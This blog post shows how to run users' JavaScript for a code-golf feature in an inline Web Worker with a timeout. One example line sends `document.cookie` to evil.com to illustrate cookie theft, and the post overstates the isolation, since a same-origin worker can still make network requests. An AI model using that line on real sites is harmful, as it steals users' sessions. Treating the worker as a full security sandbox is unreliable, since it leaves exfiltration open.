---
title: "Executing User Code Safely in the Browser"
description: "Learn how to safely execute untrusted user JavaScript in the browser using Web Workers to prevent UI freezes and security vulnerabilities like XSS attacks."
pubDate: 2026-02-22T15:40:04Z
heroImage: "/og-image.png"
tags: ["javascript", "security", "web-workers", "performance"]
draft: false
---

Here's a quick way to crash your browser tab: open the console and type `while(true) {}`.

Instant freeze. The UI becomes unresponsive, animations stop, and the only way out is to force-quit the tab.

Now imagine letting users run that code on your site.

When I started building the Code Golf feature for this blog, I faced exactly this problem. I needed to let users write JavaScript to solve puzzles, but I couldn't trust them not to write infinite loops (accidentally or maliciously).

Directly evaluating user code on the main thread is a disaster waiting to happen. Not only does it block the UI, but it also gives the code access to the DOM, cookies, and local storage. That's an XSS vulnerability served on a silver platter.

The solution isn't to sanitize the code (you can't catch everything). The solution is to isolate it.

## The Problem with Main Thread Execution

JavaScript is single-threaded. If you run a heavy computation or an infinite loop on the main thread, the entire browser tab locks up. The event loop is blocked, and no other code can run.

Worse, code running on the main thread has full access to the `window` object. A malicious user could write:

```javascript
fetch('https://evil.com/steal?cookie=' + document.cookie);
```

We need a sandbox that:
1.  Runs in a separate thread (to keep the UI responsive).
2.  Has no access to the DOM (for security).
3.  Can be terminated if it runs too long (to prevent infinite loops).

## Enter Web Workers

Web Workers are the browser's way of running scripts in background threads. They are perfect for this use case because:
-   They run in a separate global scope (`WorkerGlobalScope`).
-   They have no access to the DOM (`document` and `window` are undefined).
-   The main thread can terminate them at any time.

Here is how I implemented the sandbox for the Code Golf engine.

## The Implementation

Instead of creating a separate file for the worker, I use a `Blob` to create an inline worker. This avoids an extra HTTP request and keeps the logic self-contained.

```typescript
function runUserCode(userCode: string, input: any): Promise<any> {
  return new Promise((resolve, reject) => {
    // 1. Create the worker code
    const workerCode = `
      self.onmessage = function(e) {
        try {
          // Create a function from the user code
          const userFunc = new Function('input', e.data.code);
          const result = userFunc(e.data.input);
          self.postMessage({ success: true, result });
        } catch (err) {
          self.postMessage({ success: false, error: err.message });
        }
      };
    `;

    // 2. Create a Blob URL
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));

    // 3. Set a timeout to kill the worker if it takes too long
    const timeoutId = setTimeout(() => {
      worker.terminate();
      reject(new Error('Execution timed out (infinite loop?)'));
    }, 2000); // 2 second limit

    // 4. Handle messages
    worker.onmessage = (e) => {
      clearTimeout(timeoutId);
      if (e.data.success) {
        resolve(e.data.result);
      } else {
        reject(new Error(e.data.error));
      }
      worker.terminate(); // Clean up
    };

    worker.onerror = (err) => {
      clearTimeout(timeoutId);
      reject(err);
      worker.terminate();
    };

    // 5. Start execution
    worker.postMessage({ code: userCode, input });
  });
}
```

### Why this works

1.  **Isolation**: The code runs in a worker. If the user writes `document.body.innerHTML = ''`, it fails because `document` doesn't exist.
2.  **Responsiveness**: Even if the user writes `while(true)`, the main UI remains buttery smooth.
3.  **Safety Valve**: The `setTimeout` ensures that we kill the worker after 2 seconds. This prevents resource exhaustion on the user's machine.

## Handling Return Values

One catch with Web Workers is that data passed between threads must be serializable (via the Structured Clone Algorithm). You can pass numbers, strings, arrays, and plain objects. You cannot pass functions or DOM nodes.

For the Code Golf challenges, this is fine. The inputs are usually arrays or strings, and the outputs are primitive values.

## Conclusion

Security features are often seen as "extra work," but in this case, the secure architecture is also the most performant one. By moving execution off the main thread, we ensure the UI never freezes, regardless of how inefficient the user's code is.

If you are building any feature that executes user-defined logic—whether it's a plugin system, a formula engine, or a code golf game—Web Workers are mandatory. Don't rely on `eval()` on the main thread. It's not worth the risk.
